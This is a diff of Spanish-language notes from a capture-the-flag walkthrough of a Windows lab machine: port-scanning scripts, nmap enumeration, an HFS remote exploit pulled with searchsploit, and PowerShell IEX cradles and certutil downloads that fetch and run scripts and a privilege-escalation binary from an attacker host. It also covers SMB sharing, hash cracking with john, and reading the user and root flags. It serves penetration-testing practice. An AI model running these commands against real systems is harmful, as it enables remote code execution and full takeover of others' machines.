@@ -1,0 +1,101 @@
+-----Preparando los script------
+nc -nlvp 4646
+echo "Hola" > /dev/tcp/127.0.0.1/4646
+echo $? #El código de estado estará en 0 (Salida con éxito)
+echo "Hola" > /dev/tcp/127.0.0.1/4646
+echo $? #El código de estado estará en 1 (Salida sin éxito)
+seq 1 65535
+
+portScan.sh 10.10.10.180
+#####################################################################################
+#!/bin/bash
+trap ctrl_c INT
+
+function ctrl_c(){
+	echo -e "\n\n[*] Exiting...\n"
+	tput cnorm; exit 0
+}
+
+tput civis; for port in $(seq 1 65535); do
+	timeout 1 bash -c "echo" '' </dev/tcp/$1/$port" 2>/dev/null && echo "Port $port - OPEN" &
+done; wait
+
+tput cnorm
+######################################################################################
+
+ipScan.sh
+#####################################################################################
+#!/bin/bash
+for i in $(seq 1 255);do
+	timeout 1 bash -c "ping -c 1 10.10.10.$i" > /dev/null && echo "10.10.10.$i - Active" &
+done; wait
+######################################################################################
+
+--------Fase de Escaneo--------
+ping -c 1 10.10.10.8
+ping -c 1 10.10.10.14 -R
+nmap -p- --open -T5 -v -n 10.10.10.8 -oG todoslosPuertos (Dar tecla enter para ver la rapidez de los %)
+nmap --top-ports 5000 --open -T5 -v -n 10.10.10.8 -oG top5000Ports (Lista de los puertos 5000 más conocidos)
+cat top5000Ports | grep -oP '\d{1,5}/open' (Para ver los puertos abiertos)
+nmap -sC -sV -p80 10.10.10.8 -oN targeted (Listar información del puerto 80)
+tcpdump -i tun0 -w Captura -v (Captura paquetes)
+nmap --script http-enum -p80 10.10.10.8 -oN webScan (Fuzzer del puerto 80)
+rmk webScan (Borra el archivo)
+tshark -r Captura -Y "ip.dst == 10.10.10.8 && http" 2>/dev/null(Analizamos los paquetes)
+tshark -r Captura -Y "ip.dst == 10.10.10.8 && http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | less
+
+searchsploit httpfileserver (Buscar el nombre del exploit)
+searchsploit http file server
+searchsploit hfs
+
+searchsploit -x exploits/windows/remote/39161.py (Leer documentación)
+searchsploit -m exploits/windows/remote/39161.py (Mueve el exploit al directorio actual)
+mv 39161.py hfs_exploit.py (Renombramos el fichero)
+nano hfs_exploit.py (Editamos la configuración)
+locate nc.exe
+cp nc.exe .
+
+-------Obtener acceso--------
+python -m SimpleHTTPServer 80 (Nos levanta un servidor en localhost, podemos ver las IP y peticiones GET)
+python hfs_exploit.py 10.10.10.8 80 (Ejecutamos el exploit)
+rlwrap nc -nlvp 443 (Para poder tabular en la conexión remota)
+
+start /b powershell IEX(New-Object Net-WebClient).downloadString ('http://10.10.14.55:8000/IP.ps1') (Mandamos una peticion GET dentro del sistema y lo ponemos en escucha)
+[Enviroment]::Is64BitOperatingSystem
+[Enviroment]::Is64BitProcess
+start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net-WebClient).downloadString ('http://10.10.14.55:8000/IP.ps1') (Lo hacemos con el PowerShell de 64 bits para evitar falsos positivos)
+type C:\Users\kostas\Desktop\user.txt.txt (1º FLAG)
+
+-------Listado de Vulnerabilidades------
+cd PowerSploit/Privesc
+batgrep "function" PowerUp.ps1 (Coincidencias de la palabra "function")
+IEX(New-Object Net-WebClient).downloadString ('http://10.10.14.55:8000/PowerUp.ps1') (Mandamos una peticion GET dentro del sistema y lo ponemos en escucha)
+
+Otra forma más sigilosa:
+systeminfo (Copiamos la salida)
+nano systeminfo.txt (Pegamos todo)
+python wes.py systeminfo.txt (Usamos el Wesng para detectar que vulnerabilidades puede tener)
+python wes.py systeminfo.txt -i "Elevation of Privilege" (Buscamos un tipo de vulnerabilidad)
+
+Otra forma de sacar más información:
+pyhon windows-exploit-suggester.py --update (Se creará un archivo)
+pyhon windows-exploit-suggester.py --database 2020-11-19-mssb.xls --systeminfo systeminfo.txt
+apt install python-xlrd -y (Si da error instalar)
+
+-------Varias formas de descargar archivo dentro del sistema------
+certutil.exe -f -urlcache -split http://10.10.14.55:8000/bfill.exe bfill.exe (Nos descargamos el binario dentro de la maquina)
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.55:8000/bfill.exe', 'C:\Users\kostas\Desktop\bfill.exe')"
+powershell -c "Invoke-WebRequest 'http://10.10.14.55:8000/bfill.exe' -OutFile 'C:\Users\kostas\Desktop\bfill.exe'"
+
+impacket-smbserver smbFolder $(pwd) (Montamos y compartimos un directorio físico en samba)
+john --wordlist=rockyou.txt hash (Le pasamos el hash de samba para descifrar la contraseña)
+New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\10.10.14.55\smbFolder" (Creamos una unidad lógica)
+dir SharedFolder:\
+copy SharedFolder:\bfill.exe C:\Users\kostas\Desktop\bfill.exe
+kill %1 (Para terminar con un proceso suspendido después del Ctrl + Z)
+bfill.exe (Hacemos whoami para comprobar quien somos antes y después de escalar privilegios)
+type C:\Users\Administrator\Desktop\root.txt (2º FLAG)
+
+min 50
+
+-----Video: https://www.youtube.com/watch?v=fIGvOGrdxyc ------
